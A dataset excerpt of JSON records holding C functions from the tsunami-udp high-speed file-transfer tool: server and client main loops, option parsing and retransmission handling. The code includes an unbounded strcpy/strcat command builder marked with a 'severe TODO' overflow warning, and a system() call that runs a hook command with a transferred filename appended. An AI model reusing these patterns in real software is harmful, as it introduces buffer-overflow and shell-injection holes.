"stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void reap(int signum);\n *\n * A signal handler to take care of our children's deaths (SIGCHLD).\n *------------------------------------------------------------------------*/\n", "func_signal": "void reap(int signum)", "code": "{\n    int status;\n\n    /* accept as many deaths as we can */\n    while (waitpid(-1, &status, WNOHANG) > 0) {\n        fprintf(stderr,\"Child server process terminated with status code 0x%X\\n\", status);\n    }\n\n    /* reenable the handler */\n    signal(SIGCHLD, reap);\n}", "path": "server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * MAIN PROGRAM\n *------------------------------------------------------------------------*/\n", "func_signal": "int main(int argc, const char *argv[])", "code": "{\n    command_t        command;                           /* the current command being processed */\n    char             command_text[MAX_COMMAND_LENGTH];  /* the raw text of the command         */\n    ttp_session_t   *session = NULL;\n    ttp_parameter_t  parameter;\n   \n    int argc_curr       = 1;                            /* command line argument currently to be processed */\n    char *ptr_command_text = &command_text[0];\n   \n    /* reset the client */\n    memset(&parameter, 0, sizeof(parameter));\n    reset_client(&parameter);\n\n    /* show version / build information */\n    #ifdef VSIB_REALTIME\n    fprintf(stderr, \"Tsunami Realtime Client for protocol rev %X\\nRevision: %s\\nCompiled: %s %s\\n\"\n                    \"   /dev/vsib VSIB accesses mode is %d, gigabit=%d, 1pps embed=%d, sample skip=%d\\n\",\n            PROTOCOL_REVISION, TSUNAMI_CVS_BUILDNR, __DATE__ , __TIME__,\n            vsib_mode, vsib_mode_gigabit, vsib_mode_embed_1pps_markers, vsib_mode_skip_samples);\n    #else\n    fprintf(stderr, \"Tsunami Client for protocol rev %X\\nRevision: %s\\nCompiled: %s %s\\n\",\n            PROTOCOL_REVISION, TSUNAMI_CVS_BUILDNR, __DATE__ , __TIME__);    \n    #endif\n    \n    /* while the command loop is still running */   \n    while (1) {\n\n      /* retrieve the user's commands */\n      if (argc<=1 || argc_curr>=argc) {\n         \n         /* present the prompt */\n         fprintf(stdout, \"tsunami> \");\n         fflush(stdout);\n         /* read next command */\n         \n         if (fgets(command_text, MAX_COMMAND_LENGTH, stdin) == NULL) {\n            error(\"Could not read command input\");\n         }\n         \n      } else {\n         \n         // severe TODO: check that command_text appends do not over flow MAX_COMMAND_LENGTH...\n         \n         /* assemble next command from command line arguments */\n         for ( ; argc_curr<argc; argc_curr++) {\n            // zero argument commands\n            if (!strcasecmp(argv[argc_curr], \"close\") || !strcasecmp(argv[argc_curr], \"quit\") \n                || !strcasecmp(argv[argc_curr], \"exit\") || !strcasecmp(argv[argc_curr], \"bye\")\n                || !strcasecmp(argv[argc_curr], \"help\") || !strcasecmp(argv[argc_curr], \"dir\")) {\n               strcpy(command_text, argv[argc_curr]);\n               argc_curr += 1;\n               break; \n            } \n            // single argument commands\n            if (!strcasecmp(argv[argc_curr], \"connect\")) {\n               if (argc_curr+1 < argc) {\n                  strcpy(ptr_command_text, argv[argc_curr]);\n                  strcat(command_text, \" \");\n                  strcat(command_text, argv[argc_curr+1]);\n               } else {\n                  fprintf(stderr, \"Connect: no host specified\\n\"); \n                  exit(1);\n               }\n               argc_curr += 2;\n               break;\n            }\n            if (!strcasecmp(argv[argc_curr], \"get\")) {\n               if (argc_curr+1 < argc) {\n                  strcpy(ptr_command_text, argv[argc_curr]);\n                  strcat(command_text, \" \");\n                  strcat(command_text, argv[argc_curr+1]);\n               } else {\n                  fprintf(stderr, \"Get: no file specified\\n\"); \n                  exit(1);\n               }\n               argc_curr += 2;\n               break;\n            }\n            // double argument commands\n            if (!strcasecmp(argv[argc_curr], \"set\")) {\n               if (argc_curr+2 < argc) {\n                  strcpy(ptr_command_text, argv[argc_curr]);\n                  strcat(command_text, \" \");\n                  strcat(command_text, argv[argc_curr+1]);\n                  strcat(command_text, \" \");\n                  strcat(command_text, argv[argc_curr+2]);\n               } else {\n                  fprintf(stderr, \"Connect: no host specified\\n\"); \n                  exit(1);\n               }\n               argc_curr += 3;\n               break;\n            }\n            // unknown commands, skip\n            fprintf(stderr, \"Unsupported command console command: %s\\n\", argv[argc_curr]);\n         }\n         \n      }\n\n      /* parse the command */\n      parse_command(&command, command_text);\n\n      /* make sure we have at least one word */\n      if (command.count == 0)\n         continue;\n         \n      /* dispatch on the command type */\n           if (!strcasecmp(command.text[0], \"close\"))             command_close  (&command, session);\n      else if (!strcasecmp(command.text[0], \"connect\")) session = command_connect(&command, &parameter);\n      else if (!strcasecmp(command.text[0], \"get\"))               command_get    (&command, session);\n      else if (!strcasecmp(command.text[0], \"dir\"))               command_dir    (&command, session);\n      else if (!strcasecmp(command.text[0], \"help\"))              command_help   (&command, session);\n      else if (!strcasecmp(command.text[0], \"quit\"))              command_quit   (&command, session);\n      else if (!strcasecmp(command.text[0], \"exit\"))              command_quit   (&command, session);\n      else if (!strcasecmp(command.text[0], \"bye\"))               command_quit   (&command, session);\n      else if (!strcasecmp(command.text[0], \"set\"))               command_set    (&command, &parameter);\n      else\n          fprintf(stderr, \"Unrecognized command: '%s'.  Use 'HELP' for help.\\n\\n\", command.text[0]);\n    }\n\n    /* if we're here, we shouldn't be */\n    return 1;\n}", "path": "rtclient\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int ttp_accept_retransmit(ttp_session_t *session,\n *                           retransmission_t *retransmission,\n *                           u_char *datagram);\n *\n * Handles the given retransmission request.  The actions taken depend\n * on the nature of the request:\n *\n *   REQUEST_RETRANSMIT -- Retransmit the given block.\n *   REQUEST_RESTART    -- Restart the transfer at the given block.\n *   REQUEST_ERROR_RATE -- Use the given error rate to adjust the IPD.\n *\n * For REQUEST_RETRANSMIT messsages, the given buffer must be large\n * enough to hold (block_size + 6) bytes.  For other messages, the\n * datagram parameter is ignored.\n *\n * Returns 0 on success and non-zero on failure.\n *------------------------------------------------------------------------*/\n", "func_signal": "int ttp_accept_retransmit(ttp_session_t *session, retransmission_t *retransmission, u_char *datagram)", "code": "{\n    ttp_transfer_t  *xfer      = &session->transfer;\n    ttp_parameter_t *param     = session->parameter;\n    static int       iteration = 0;\n    static char      stats_line[80];\n    int              status;\n    u_int16_t        type;\n  \n    /* convert the retransmission fields to host byte order */\n    retransmission->block      = ntohl(retransmission->block);\n    retransmission->error_rate = ntohl(retransmission->error_rate);\n    type                       = ntohs(retransmission->request_type);\n\n    /* if it's an error rate notification */\n    if (type == REQUEST_ERROR_RATE) {\n\n\t/* calculate a new IPD */\n\tif (retransmission->error_rate > param->error_rate) {\n\t    double factor1 = (1.0 * param->slower_num / param->slower_den) - 1.0;\n\t    double factor2 = (1.0 + retransmission->error_rate - param->error_rate) / (100000.0 - param->error_rate);\n\t    xfer->ipd_current *= 1.0 + (factor1 * factor2);\n\t} else {\n\t    xfer->ipd_current *= (double) param->faster_num / param->faster_den;\n\t}\n\n    /* make sure the IPD is still in range, for later calculations */\n    xfer->ipd_current = max(min(xfer->ipd_current, 10000.0), param->ipd_time);\n\n    /* build the stats string */\n    sprintf(stats_line, \"%6u %3.2fus %5uus %7u %6.2f %3u\\n\",\n        retransmission->error_rate, (float)xfer->ipd_current, param->ipd_time, xfer->block,\n        100.0 * xfer->block / param->block_count, session->session_id);\n\n\t/* print a status report */\n\tif (!(iteration++ % 23))\n\t    printf(\" erate     ipd  target   block   %%done srvNr\\n\");\n\tprintf(\"%s\", stats_line);\n\n\t/* print to the transcript if the user wants */\n\tif (param->transcript_yn)\n\t    xscript_data_log(session, stats_line);\n\n    /* if it's a restart request */\n    } else if (type == REQUEST_RESTART) {\n\n\t/* do range-checking first */\n\tif ((retransmission->block == 0) || (retransmission->block > param->block_count)) {\n\t    sprintf(g_error, \"Attempt to restart at illegal block %u\", retransmission->block);\n\t    return warn(g_error);\n\t} else\n\t    xfer->block = retransmission->block;\n\n    /* if it's a retransmit request */\n    } else if (type == REQUEST_RETRANSMIT) {\n\n        /* build the retransmission */\n        status = build_datagram(session, retransmission->block, TS_BLOCK_RETRANSMISSION, datagram);\n        if (status < 0) {\n            sprintf(g_error, \"Could not build retransmission for block %u\", retransmission->block);\n            return warn(g_error);\n        }\n      \n        /* try to send out the block */\n        status = sendto(xfer->udp_fd, datagram, 6 + param->block_size, 0, xfer->udp_address, xfer->udp_length);\n        if (status < 0) {\n            sprintf(g_error, \"Could not retransmit block %u\", retransmission->block);\n            return warn(g_error);\n        }\n\n    /* if it's another kind of request */\n    } else {\n\tsprintf(g_error, \"Received unknown retransmission request of type %u\", ntohs(retransmission->request_type));\n\treturn warn(g_error);\n    }\n\n    /* we're done */\n    return 0;\n}", "path": "rtserver\\protocol.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void client_handler(ttp_session_t *session);\n *\n * This routine is run by the client processes that are created in\n * response to incoming connections.\n *------------------------------------------------------------------------*/\n", "func_signal": "void client_handler(ttp_session_t *session)", "code": "{\n    retransmission_t  retransmission;                /* the retransmission data object                 */\n    struct timeval    start, stop;                   /* the start and stop times for the transfer      */\n    struct timeval    prevpacketT;                   /* the send time of the previous packet           */\n    struct timeval    currpacketT;                   /* the interpacket delay value                    */\n    struct timeval    lastfeedback;                  /* the time since last client feedback            */\n    struct timeval    lasthblostreport;              /* the time since last 'heartbeat lost' report    */\n    u_int32_t         deadconnection_counter;        /* the counter for checking dead conn timeout     */\n    int               retransmitlen;                 /* number of bytes read from retransmission queue */\n    u_char            datagram[MAX_BLOCK_SIZE + 6];  /* the datagram containing the file block         */\n    int64_t           ipd_time;                      /* the time to delay/sleep after packet, signed   */\n    int64_t           ipd_usleep_diff;               /* the time correction to ipd_time, signed        */\n    int64_t           ipd_time_max;\n    int               status;\n    ttp_transfer_t   *xfer  = &session->transfer;\n    ttp_parameter_t  *param =  session->parameter;\n    u_int64_t         delta;\n    u_char            block_type;\n\n    /* negotiate the connection parameters */\n    status = ttp_negotiate(session);\n    if (status < 0)\n        error(\"Protocol revision number mismatch\");\n\n    /* have the client try to authenticate to us */\n    status = ttp_authenticate(session, session->parameter->secret);\n    if (status < 0)\n        error(\"Client authentication failure\");\n\n    if (1==param->verbose_yn) {\n        fprintf(stderr,\"Client authenticated. Negotiated parameters are:\\n\");\n        fprintf(stderr,\"Block size: %d\\n\", param->block_size);\n        fprintf(stderr,\"Buffer size: %d\\n\", param->udp_buffer); \n        fprintf(stderr,\"Port: %d\\n\", param->tcp_port);    \n    }\n\n    /* while we haven't been told to stop */\n    while (1) {\n\n    /* make the client descriptor blocking */\n    status = fcntl(session->client_fd, F_SETFL, 0);\n    if (status < 0)\n        error(\"Could not make client socket blocking\");\n\n    /* negotiate another transfer */\n    status = ttp_open_transfer(session);\n    if (status < 0) {\n        warn(\"Invalid file request\");\n        continue;\n    }\n\n    /* negotiate a data transfer port */\n    status = ttp_open_port(session);\n    if (status < 0) {\n        warn(\"UDP socket creation failed\");\n        continue;\n    }\n\n    /* make the client descriptor non-blocking again */\n    status = fcntl(session->client_fd, F_SETFL, O_NONBLOCK);\n    if (status < 0)\n        error(\"Could not make client socket non-blocking\");\n\n    /*---------------------------\n     * START TIMING\n     *---------------------------*/\n    gettimeofday(&start, NULL);\n    if (param->transcript_yn)\n        xscript_data_start(session, &start);\n\n    lasthblostreport       = start;\n    lastfeedback           = start;\n    prevpacketT            = start;\n    deadconnection_counter = 0;\n    ipd_time               = 0;\n    ipd_time_max           = 0;\n    ipd_usleep_diff        = 0;\n    retransmitlen          = 0;\n\n    /* start by blasting out every block */\n    xfer->block = 0;\n    while (xfer->block <= param->block_count) {\n\n        /* default: flag as retransmitted block */\n        block_type = TS_BLOCK_RETRANSMISSION;\n\n        /* precalculate time to wait after sending the next packet */\n        gettimeofday(&currpacketT, NULL);\n        ipd_usleep_diff = xfer->ipd_current + tv_diff_usec(prevpacketT, currpacketT);\n        prevpacketT = currpacketT;\n        if (ipd_usleep_diff > 0 || ipd_time > 0) {\n            ipd_time += ipd_usleep_diff;\n        }\n        ipd_time_max = (ipd_time > ipd_time_max) ? ipd_time : ipd_time_max;\n\n        /* see if transmit requests are available */\n        status = read(session->client_fd, ((char*)&retransmission)+retransmitlen, sizeof(retransmission)-retransmitlen);\n        #ifndef VSIB_REALTIME\n        if ((status <= 0) && (errno != EAGAIN))\n            error(\"Retransmission read failed\");\n        #else\n        if ((status <= 0) && (errno != EAGAIN) && (!session->parameter->fileout))\n            error(\"Retransmission read failed and not writing local backup file\");\n        #endif\n        if (status > 0)\n            retransmitlen += status;\n\n        /* if we have a retransmission */\n        if (retransmitlen == sizeof(retransmission_t)) {\n\n            /* store current time */\n            lastfeedback           = currpacketT;\n            lasthblostreport       = currpacketT;\n            deadconnection_counter = 0;\n\n            /* if it's a stop request, go back to waiting for a filename */\n            if (ntohs(retransmission.request_type) == REQUEST_STOP) {\n\n               fprintf(stderr, \"Transmission of %s complete.\\n\", xfer->filename);\n\n               if(param->finishhook)\n               {\n                   const int MaxCommandLength = 1024;\n                   char cmd[MaxCommandLength];\n                   int v;\n\n                   v = snprintf(cmd, MaxCommandLength, \"%s %s\", param->finishhook, xfer->filename);\n                   if(v >= MaxCommandLength)\n                   {\n                       fprintf(stderr, \"Error: command buffer too short\\n\");\n                   }\n                   else\n                   {\n                       fprintf(stderr, \"Executing: %s\\n\", cmd);\n                       system(cmd);\n                   }\n                }\n\n                break;\n            }\n\n            /* otherwise, handle the retransmission */\n            status = ttp_accept_retransmit(session, &retransmission, datagram);\n            if (status < 0)\n                warn(\"Retransmission error\");\n            retransmitlen = 0;\n\n        /* if we have no retransmission */\n        } else if (retransmitlen < sizeof(retransmission_t)) {\n\n            /* build the block */\n            xfer->block = min(xfer->block + 1, param->block_count);\n            block_type = (xfer->block == param->block_count) ? TS_BLOCK_TERMINATE : TS_BLOCK_ORIGINAL;\n            status = build_datagram(session, xfer->block, block_type, datagram);\n            if (status < 0) {\n                sprintf(g_error, \"Could not read block #%u\", xfer->block);\n                error(g_error);\n            }\n\n            /* transmit the block */\n            status = sendto(xfer->udp_fd, datagram, 6 + param->block_size, 0, xfer->udp_address, xfer->udp_length);\n            if (status < 0) {\n                sprintf(g_error, \"Could not transmit block #%u\", xfer->block);\n                warn(g_error);\n                continue;\n            }\n\n        /* if we have too long retransmission message */\n        } else if (retransmitlen > sizeof(retransmission_t)) {\n\n            fprintf(stderr, \"warn: retransmitlen > %d\\n\", (int)sizeof(retransmission_t));\n            retransmitlen = 0;\n\n        }\n\n        /* monitor client heartbeat and disconnect dead client */\n        if ((deadconnection_counter++) > 2048) {\n            char stats_line[160];\n\n            deadconnection_counter = 0;\n\n            /* limit 'heartbeat lost' reports to 500ms intervals */\n            if (get_usec_since(&lasthblostreport) < 500000.0) continue;\n            gettimeofday(&lasthblostreport, NULL);\n\n            /* throttle IPD with fake 100% loss report */\n            #ifndef VSIB_REALTIME\n            retransmission.request_type = htons(REQUEST_ERROR_RATE);\n            retransmission.error_rate   = htonl(100000);\n            retransmission.block = 0;\n            ttp_accept_retransmit(session, &retransmission, datagram);\n            #endif\n\n            delta = get_usec_since(&lastfeedback);\n\n            /* show an (additional) statistics line */\n            snprintf(stats_line, sizeof(stats_line)-1,\n                                \"   n/a     n/a     n/a %7u %6.2f %3u -- no heartbeat since %3.2fs\\n\",\n                                xfer->block, 100.0 * xfer->block / param->block_count, session->session_id,\n                                1e-6*delta);\n            if (param->transcript_yn)\n               xscript_data_log(session, stats_line);\n            fprintf(stderr, \"%s\", stats_line);\n\n            /* handle timeout for normal file transfers */\n            #ifndef VSIB_REALTIME\n            if ((1e-6 * delta) > param->hb_timeout) {\n                fprintf(stderr, \"Heartbeat timeout of %d seconds reached, terminating transfer.\\n\", param->hb_timeout);\n                break;\n            }\n            #else\n            /* handle timeout condition for : realtime with local backup, simple realtime */\n            if ((1e-6 * delta) > param->hb_timeout) {\n                if ((session->parameter->fileout) && (block_type == TS_BLOCK_TERMINATE)) {\n                    fprintf(stderr, \"Reached the Terminate block and timed out, terminating transfer.\\n\");\n                    break;\n                } else if(!session->parameter->fileout) {\n                    fprintf(stderr, \"Heartbeat timeout of %d seconds reached and not doing local backup, terminating transfer now.\\n\", param->hb_timeout);\n                    break;\n                } else {\n                    lastfeedback = currpacketT;\n                }\n            }\n            #endif\n        }\n\n         /* wait before handling the next packet */\n         if (block_type == TS_BLOCK_TERMINATE) {\n             usleep_that_works(10*ipd_time_max);\n         }\n         if (ipd_time > 0) {\n             usleep_that_works(ipd_time);\n         }\n\n    }\n\n    /*---------------------------\n     * STOP TIMING\n     *---------------------------*/\n    gettimeofday(&stop, NULL);\n    if (param->transcript_yn)\n        xscript_data_stop(session, &stop);\n    delta = 1000000LL * (stop.tv_sec - start.tv_sec) + stop.tv_usec - start.tv_usec;\n\n    /* report on the transfer */\n    if (param->verbose_yn)\n        fprintf(stderr, \"Server %d transferred %llu bytes in %0.2f seconds (%0.1f Mbps)\\n\",\n                session->session_id, (ull_t)param->file_size, delta / 1000000.0, \n                8.0 * param->file_size / (delta * 1e-6 * 1024*1024) );\n\n    /* close the transcript */\n    if (param->transcript_yn)\n        xscript_close(session, delta);\n\n    #ifndef VSIB_REALTIME\n\n    /* close the file */\n    fclose(xfer->file);\n\n    #else\n\n    /* VSIB local disk copy: close file only if file output was requested */\n    if (param->fileout) {\n        fclose(xfer->file);\n    }\n\n    /* stop the VSIB */\n    stop_vsib(session);\n    fclose(xfer->vsib);\n\n    #endif\n\n    /* close the UDP socket */\n    close(xfer->udp_fd);\n    memset(xfer, 0, sizeof(*xfer));\n\n    } //while(1)\n\n}", "path": "server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void parse_command(command_t *command, char *buffer);\n *\n * Given a buffer containing the text of a command, replaces the\n * whitespace with null terminators and fills the given command\n * structure with pointers to the words in the command.\n *------------------------------------------------------------------------*/\n", "func_signal": "void parse_command(command_t *command, char *buffer)", "code": "{\n    /* reset the count */\n    command->count = 0;\n\n    /* skip past initial whitespace */\n    while (isspace(*buffer) && *buffer)\n\t++buffer;\n\n    /* while we have command text left and not too many words */\n    while ((command->count < MAX_COMMAND_WORDS) && *buffer) {\n\n\t/* save the start of the word */\n\tcommand->text[command->count++] = buffer;\n\n\t/* advance to the next whitespace (or the end) */\n\twhile (*buffer && !isspace(*buffer))\n\t    ++buffer;\n\n\t/* convert the whitespace to terminators */\n\twhile (*buffer && isspace(*buffer))\n\t    *(buffer++) = '\\0';\n    }\n}", "path": "rtclient\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * MAIN PROGRAM\n *------------------------------------------------------------------------*/\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n    int                server_fd, client_fd;\n    struct sockaddr_in remote_address;\n    socklen_t          remote_length = sizeof(struct sockaddr_in);\n    ttp_parameter_t    parameter;\n    ttp_session_t      session;\n    pid_t              child_pid;\n\n    /* initialize our parameters */\n    memset(&session, 0, sizeof(session));\n    reset_server(&parameter);\n\n    /* process our command-line options */\n    process_options(argc, argv, &parameter);\n\n    /* obtain our server socket */\n    server_fd = create_tcp_socket(&parameter);\n    if (server_fd < 0) {\n        sprintf(g_error, \"Could not create server socket on port %d\", parameter.tcp_port);\n        return error(g_error);\n    }\n\n    /* install a signal handler for our children */\n    signal(SIGCHLD, reap);\n\n    /* now show version / build information */\n    #ifdef VSIB_REALTIME\n    fprintf(stderr, \"Tsunami Realtime Server for protocol rev %X\\nRevision: %s\\nCompiled: %s %s\\n\"\n                    \"   /dev/vsib VSIB accesses mode=%d, sample skip=%d, gigabit=%d, 1pps embed=%d\\n\"\n                    \"Waiting for clients to connect.\\n\",\n            PROTOCOL_REVISION, TSUNAMI_CVS_BUILDNR, __DATE__ , __TIME__,\n            vsib_mode, vsib_mode_skip_samples, vsib_mode_gigabit, vsib_mode_embed_1pps_markers);\n    #else\n    fprintf(stderr, \"Tsunami Server for protocol rev %X\\nRevision: %s\\nCompiled: %s %s\\n\"\n                    \"Waiting for clients to connect.\\n\",\n            PROTOCOL_REVISION, TSUNAMI_CVS_BUILDNR, __DATE__ , __TIME__);\n    #endif\n\n    /* while our little world keeps turning */\n    while (1) {\n\n        /* accept a new client connection */\n        client_fd = accept(server_fd, (struct sockaddr *) &remote_address, &remote_length);\n        if (client_fd < 0) {\n            warn(\"Could not accept client connection\");\n            continue;\n        } else {\n            fprintf(stderr, \"New client connecting from %s...\\n\", inet_ntoa(remote_address.sin_addr));\n        }\n\n        /* and fork a new child process to handle it */\n        child_pid = fork();\n        if (child_pid < 0) {\n            warn(\"Could not create child process\");\n            continue;\n        }\n        session.session_id++;\n\n        /* if we're the child */\n        if (child_pid == 0) {\n\n            /* close the server socket */\n            close(server_fd);\n\n            /* set up the session structure */\n            session.client_fd = client_fd;\n            session.parameter = &parameter;\n            memset(&session.transfer, 0, sizeof(session.transfer));\n            session.transfer.ipd_current = 0.0;\n\n            /* and run the client handler */\n            client_handler(&session);\n            return 0;\n\n        /* if we're the parent */\n        } else {\n\n            /* close the client socket */\n            close(client_fd);\n        }\n    }\n}", "path": "server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void process_options(int argc, char *argv[],\n *                      ttp_parameter_t *parameter);\n *\n * Processes the command-line options and sets the protocol parameters\n * as appropriate.\n *------------------------------------------------------------------------*/\n", "func_signal": "void process_options(int argc, char *argv[], ttp_parameter_t *parameter)", "code": "{\n    struct option long_options[] = { { \"verbose\",    0, NULL, 'v' },\n                     { \"transcript\", 0, NULL, 't' },\n                     { \"v6\",         0, NULL, '6' },\n                     { \"port\",       1, NULL, 'p' },\n                     { \"secret\",     1, NULL, 's' },\n                     { \"buffer\",     1, NULL, 'b' },\n                     { \"hbtimeout\",  1, NULL, 'h' },\n                     { \"v\",          0, NULL, 'v' },\n                     { \"client\",     1, NULL, 'c' },\n                     { \"finishhook\", 1, NULL, 'f' },\n                     { \"allhook\",    1, NULL, 'a' },\n                     #ifdef VSIB_REALTIME\n                     { \"vsibmode\",   1, NULL, 'M' },\n                     { \"vsibskip\",   1, NULL, 'S' },\n                     #endif\n                     { NULL,         0, NULL, 0 } };\n    struct stat   filestat;\n    int           which;\n\n    /* for each option found */\n    while ((which = getopt_long(argc, argv, \"+\", long_options, NULL)) > 0) {\n\n    /* depending on which option we got */\n    switch (which) {\n\n        /* --verbose    : enter verbose mode for debugging */\n        case 'v':  parameter->verbose_yn = 1;\n             break;\n\n        /* --transcript : enter transcript mode for recording stats */\n        case 't':  parameter->transcript_yn = 1;\n                 break;\n\n        /* --v6         : enter IPv6 mode */\n        case '6':  parameter->ipv6_yn = 1;\n                 break;\n\n        /* --port=i     : port number for the server */\n        case 'p':  parameter->tcp_port   = atoi(optarg);\n             break;\n\n        /* --secret=s   : shared secret for the client and server */\n        case 's':  parameter->secret     = (unsigned char*)optarg;\n             break;\n\n        /* --client=c   : Force different client IP from TCP connection */\n        case 'c':  parameter->client     = optarg;\n             break;\n\n        /* --finishhook=h : program to execute after transfer completes */\n        case 'f':  parameter->finishhook = (unsigned char*)optarg;\n             break;\n\n        /* --finishhook=h : program to execute to get list of files for get * */\n        case 'a':  parameter->allhook = (unsigned char*)optarg;\n             break;\n\n        /* --buffer=i   : size of socket buffer */\n        case 'b':  parameter->udp_buffer = atoi(optarg);\n             break;\n\n        /* --hbtimeout=i : client heartbeat timeout in seconds */\n        case 'h': parameter->hb_timeout = atoi(optarg);\n             break;\n\n        #ifdef VSIB_REALTIME\n        /* --vsibmode=i   : size of socket buffer */\n        case 'M':  vsib_mode = atoi(optarg);\n             break;\n\n        /* --vsibskip=i   : size of socket buffer */\n        case 'S':  vsib_mode_skip_samples = atoi(optarg);\n             break;\n        #endif\n\n        /* otherwise    : display usage information */\n        default: \n             fprintf(stderr, \"Usage: tsunamid [--verbose] [--transcript] [--v6] [--port=n] [--buffer=bytes]\\n\");\n             fprintf(stderr, \"                [--hbtimeout=seconds] [--allhook=cmd] [--finishhook=cmd]\\n\");\n\t\t\t fprintf(stderr, \"                \");\n             #ifdef VSIB_REALTIME\n             fprintf(stderr, \"[--vsibmode=mode] [--vsibskip=skip] [filename1 filename2 ...]\\n\\n\");\n             #else\n             fprintf(stderr, \"[filename1 filename2 ...]\\n\\n\");\n             #endif\n             fprintf(stderr, \"verbose or v : turns on verbose output mode\\n\");\n             fprintf(stderr, \"transcript   : turns on transcript mode for statistics recording\\n\");\n             fprintf(stderr, \"v6           : operates using IPv6 instead of (not in addition to!) IPv4\\n\");\n             fprintf(stderr, \"port         : specifies which TCP port on which to listen to incoming connections\\n\");\n             fprintf(stderr, \"secret       : specifies the shared secret for the client and server\\n\");\n             fprintf(stderr, \"client       : specifies an alternate client IP or host where to send data\\n\");\n             fprintf(stderr, \"buffer       : specifies the desired size for UDP socket send buffer (in bytes)\\n\");\n             fprintf(stderr, \"hbtimeout    : specifies the timeout in seconds for disconnect after client heartbeat lost\\n\");\n\t\t\t fprintf(stderr, \"finishhook   : run command on transfer completion, file name is appended automatically\\n\");\n\t\t\t fprintf(stderr, \"allhook      : run command on 'get *' to produce a custom file list for client downloads\\n\");\t\t\t \n             #ifdef VSIB_REALTIME\n             fprintf(stderr, \"vsibmode     : specifies the VSIB mode to use (see VSIB documentation for modes)\\n\");\n             fprintf(stderr, \"vsibskip     : a value N other than 0 will skip N samples after every 1 sample\\n\");\n             #endif\n             fprintf(stderr, \"filenames    : list of files to share for downloaded via a client 'GET *'\\n\");\n             fprintf(stderr, \"\\n\");\n             fprintf(stderr, \"Defaults: verbose    = %d\\n\",   DEFAULT_VERBOSE_YN);\n             fprintf(stderr, \"          transcript = %d\\n\",   DEFAULT_TRANSCRIPT_YN);\n             fprintf(stderr, \"          v6         = %d\\n\",   DEFAULT_IPV6_YN);\n             fprintf(stderr, \"          port       = %d\\n\",   DEFAULT_TCP_PORT);\n             fprintf(stderr, \"          buffer     = %d bytes\\n\",   DEFAULT_UDP_BUFFER);\n             fprintf(stderr, \"          hbtimeout  = %d seconds\\n\",   DEFAULT_HEARTBEAT_TIMEOUT);\n             #ifdef VSIB_REALTIME\n             fprintf(stderr, \"          vsibmode   = %d\\n\",   0);\n             fprintf(stderr, \"          vsibskip   = %d\\n\",   0);\n             #endif\n             fprintf(stderr, \"\\n\");\n             exit(1);\n    }\n    }\n\n    if (argc>optind) {\n        int counter;\n        parameter->file_names = argv+optind;\n        parameter->file_name_size = 0;\n        parameter->total_files = argc-optind;\n        parameter->file_sizes = (size_t*)malloc(sizeof(size_t) * parameter->total_files);\n        fprintf(stderr, \"\\nThe specified %d files will be listed on GET *:\\n\", parameter->total_files);\n        for (counter=0; counter < argc-optind; counter++) {\n            stat(parameter->file_names[counter], &filestat);\n            parameter->file_sizes[counter] = filestat.st_size;\n            parameter->file_name_size += strlen(parameter->file_names[counter])+1;\n            fprintf(stderr, \" %3d)   %-20s  %llu bytes\\n\", counter+1, parameter->file_names[counter], (ull_t)parameter->file_sizes[counter]);\n        }\n        fprintf(stderr, \"total characters %d\\n\", parameter->file_name_size);\n    }\n\n    if (1==parameter->verbose_yn) {\n       fprintf(stderr,\"Block size: %d\\n\", parameter->block_size);\n       fprintf(stderr,\"Buffer size: %d\\n\", parameter->udp_buffer);\n       fprintf(stderr,\"Port: %d\\n\", parameter->tcp_port);\n    }\n}", "path": "server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void client_handler(ttp_session_t *session);\n *\n * This routine is run by the client processes that are created in\n * response to incoming connections.\n *------------------------------------------------------------------------*/\n", "func_signal": "void client_handler(ttp_session_t *session)", "code": "{\n    retransmission_t  retransmission;                /* the retransmission data object                 */\n    struct timeval    start, stop;                   /* the start and stop times for the transfer      */\n    struct timeval    delay;                         /* the interpacket delay value                    */\n    int               result;                        /* number of bytes read from retransmission queue */\n    u_char            datagram[MAX_BLOCK_SIZE + 6];  /* the datagram containing the file block         */\n    u_int64_t         ipd_time;                      /* the time to delay after this packet            */\n    int               status;\n    ttp_transfer_t   *xfer  = &session->transfer;\n    ttp_parameter_t  *param =  session->parameter;\n    u_int64_t         delta;\n    u_char            block_new;\n\n    /* negotiate the connection parameters */\n    status = ttp_negotiate(session);\n    if (status < 0)\n        error(\"Protocol revision number mismatch\");\n\n    /* have the client try to authenticate to us */\n    status = ttp_authenticate(session, session->parameter->secret);\n    if (status < 0)\n        error(\"Client authentication failure\");\n    \n    if (1==param->verbose_yn) {\n        fprintf(stderr,\"New client connection, authenticated. Server params are:\\n\");\n        fprintf(stderr,\"Block size: %d\\n\", param->block_size);\n        fprintf(stderr,\"Buffer size: %d\\n\", param->udp_buffer); \n        fprintf(stderr,\"Port: %d\\n\", param->tcp_port);    \n    }\n\n    /* while we haven't been told to stop */\n    while (1) {\n\n\t/* make the client descriptor blocking */\n\tstatus = fcntl(session->client_fd, F_SETFL, 0);\n\tif (status < 0)\n\t    error(\"Could not make client socket blocking\");\n\n\t/* negotiate another transfer */\n\tstatus = ttp_open_transfer(session);\n\tif (status < 0) {\n\t    warn(\"Invalid file request\");\n\t    continue;\n\t}\n\n\t/* negotiate a data transfer port */\n\tstatus = ttp_open_port(session);\n\tif (status < 0) {\n\t    warn(\"UDP socket creation failed\");\n\t    continue;\n\t}\n\n\t/* make the client descriptor non-blocking again */\n\tstatus = fcntl(session->client_fd, 